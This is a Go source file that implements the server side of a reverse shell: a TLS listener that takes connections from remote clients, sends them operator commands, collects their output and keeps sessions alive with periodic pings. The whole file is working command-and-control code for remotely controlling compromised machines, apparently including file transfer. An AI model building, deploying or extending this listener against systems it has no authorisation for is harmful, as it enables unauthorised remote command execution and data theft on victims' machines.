package server

import (
	"bufio"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync"
	"time"
)

// Listener represents a reverse shell listener server
type Listener struct {
	port              string
	networkInterface  string
	tlsConfig         *tls.Config
	clientConnections map[string]chan string
	clientResponses   map[string]chan string
	mutex             sync.Mutex
}

// NewListener creates a new reverse shell listener
func NewListener(port, networkInterface string, tlsConfig *tls.Config) *Listener {
	return &Listener{
		port:              port,
		networkInterface:  networkInterface,
		tlsConfig:         tlsConfig,
		clientConnections: make(map[string]chan string),
		clientResponses:   make(map[string]chan string),
	}
}

// Start begins listening for client connections
func (l *Listener) Start() (net.Listener, error) {
	address := fmt.Sprintf("%s:%s", l.networkInterface, l.port)
	log.Printf("Starting TLS listener on %s", address)

	listener, err := tls.Listen("tcp", address, l.tlsConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to create TLS listener: %v", err)
	}

	go l.acceptConnections(listener)
	return listener, nil
}

// acceptConnections accepts incoming client connections
func (l *Listener) acceptConnections(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Error accepting connection: %v", err)
			continue
		}
		go l.handleClient(conn)
	}
}

// handleClient handles a single client connection
func (l *Listener) handleClient(conn net.Conn) {
	clientAddr := conn.RemoteAddr().String()
	log.Printf("[+] New client connected: %s", clientAddr)
	defer conn.Close()

	cmdChan := make(chan string, 10)
	respChan := make(chan string, 10)

	l.mutex.Lock()
	l.clientConnections[clientAddr] = cmdChan
	l.clientResponses[clientAddr] = respChan
	l.mutex.Unlock()

	defer func() {
		l.mutex.Lock()
		delete(l.clientConnections, clientAddr)
		delete(l.clientResponses, clientAddr)
		l.mutex.Unlock()
		close(cmdChan)
		close(respChan)
		log.Printf("[-] Client disconnected: %s", clientAddr)
	}()

	reader := bufio.NewReaderSize(conn, 1024*1024) // 1MB read buffer for large file transfers
	writer := bufio.NewWriterSize(conn, 1024*1024) // 1MB write buffer

	// Track if response reader goroutine has failed
	readerFailed := make(chan bool, 1)

	// Read responses from client
	go func() {
		var responseBuffer strings.Builder
		for {
			line, err := reader.ReadString('\n')

			// Append what we received, even if the buffer filled before newline
			responseBuffer.WriteString(line)

			// If the buffer filled before we hit a newline, keep reading without closing the connection
			if errors.Is(err, bufio.ErrBufferFull) {
				if responseBuffer.Len() > 10*1024*1024 { // avoid unbounded growth
					log.Printf("Response from client %s exceeds 10MB without delimiter; resetting buffer", clientAddr)
					responseBuffer.Reset()
				}
				continue
			}

			if err != nil {
				if err != io.EOF {
					log.Printf("Error reading from client %s: %v", clientAddr, err)
				}
				readerFailed <- true
				return
			}

			// Check if we've reached the end of output marker anywhere in the buffer
			if strings.Contains(responseBuffer.String(), "<<<END_OF_OUTPUT>>>") {
				fullResponse := responseBuffer.String()
				select {
				case respChan <- fullResponse:
				case <-time.After(5 * time.Second):
					log.Printf("Warning: response channel full or blocked for client %s", clientAddr)
				}
				responseBuffer.Reset()
			}
		}
	}()

	// Wait for commands
	for {
		select {
		case cmd, ok := <-cmdChan:
			if !ok {
				return
			}
			fmt.Fprintf(writer, "%s\n", cmd)
			writer.Flush()

			if cmd == "exit" {
				return
			}
		case <-readerFailed:
			log.Printf("Reader failed for client %s, closing connection", clientAddr)
			return
		case <-time.After(30 * time.Second):
			fmt.Fprintf(writer, "PING\n")
			writer.Flush()
		}
	}
}

// GetClients returns a list of connected client addresses
func (l *Listener) GetClients() []string {
	l.mutex.Lock()
	defer l.mutex.Unlock()

	clients := make([]string, 0, len(l.clientConnections))
	for addr := range l.clientConnections {
		clients = append(clients, addr)
	}
	return clients
}

// SendCommand sends a command to a specific client
func (l *Listener) SendCommand(clientAddr, cmd string) error {
	l.mutex.Lock()
	cmdChan, exists := l.clientConnections[clientAddr]
	l.mutex.Unlock()

	if !exists {
		return fmt.Errorf("client %s not found", clientAddr)
	}

	select {
	case cmdChan <- cmd:
		return nil
	case <-time.After(5 * time.Second):
		return fmt.Errorf("timeout sending command")
	}
}

// GetResponse gets the response from a client
func (l *Listener) GetResponse(clientAddr string, timeout time.Duration) (string, error) {
	l.mutex.Lock()
	respChan, exists := l.clientResponses[clientAddr]
	l.mutex.Unlock()

	if !exists {
		return "", fmt.Errorf("client %s not found", clientAddr)
	}

	select {
	case resp := <-respChan:
		return resp, nil
	case <-time.After(timeout):
		return "", fmt.Errorf("timeout waiting for response")
	}
}

// GetClientAddressSorted returns sorted client addresses for consistent ordering
func (l *Listener) GetClientAddressesSorted() []string {
	l.mutex.Lock()
	defer l.mutex.Unlock()

	clients := make([]string, 0, len(l.clientConnections))
	for addr := range l.clientConnections {
		clients = append(clients, addr)
	}
	// In a real implementation, you'd sort these
	return clients
}
